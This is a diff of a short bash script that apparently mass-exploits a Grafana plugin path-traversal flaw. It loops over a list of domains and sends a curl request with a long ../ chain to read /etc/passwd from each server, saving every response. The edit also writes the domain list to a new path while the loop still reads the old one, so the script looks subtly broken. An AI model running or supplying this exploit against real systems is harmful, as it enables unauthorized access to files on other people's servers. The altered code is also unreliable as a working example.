@@ -2,13 +2,12 @@
 
 list=$1
 method=$2
-
-cat $list | sed 's/^http\(\|s\):\/\///g' | tee ~/all_list.txt
-
-for domain in $(cat ~/all_list.txt);do
-
 mkdir -p ~/grafana_cve/
 dir=~/grafana_cve/
+
+cat $list | sed 's/^http\(\|s\):\/\///g' | tee $dir/all_list.txt
+
+for domain in $(cat ~/all_list.txt);do
 
 curl --path-as-is -k -D- "$method://$domain/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd" | tee $dir/$domain
 
